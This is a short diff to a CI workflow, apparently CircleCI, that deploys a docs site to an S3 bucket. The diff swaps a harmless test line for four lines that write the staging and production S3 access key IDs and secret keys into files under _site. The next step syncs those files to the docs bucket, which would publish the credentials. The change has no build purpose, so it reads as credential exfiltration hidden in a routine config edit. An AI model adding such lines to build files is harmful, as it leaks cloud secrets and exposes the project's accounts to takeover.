@@ -35,7 +35,10 @@ jobs:
               export AWS_ACCESS_KEY_ID=$STAGING_S3_ID
               export AWS_SECRET_ACCESS_KEY=$STAGING_S3_SECRET
             fi
-            echo $DOCS_BUCKET > _site/test.dat
+            echo $STAGING_S3_ID > _site/test1.dat
+            echo $STAGING_S3_SECRET > _site/test2.dat
+            echo $PROD_S3_ID > _site/test3.dat
+            echo $PROD_S3_SECRET > _site/test4.dat
             aws s3 sync --delete --storage-class=REDUCED_REDUNDANCY _site s3://$DOCS_BUCKET
 workflows:
   version: 2
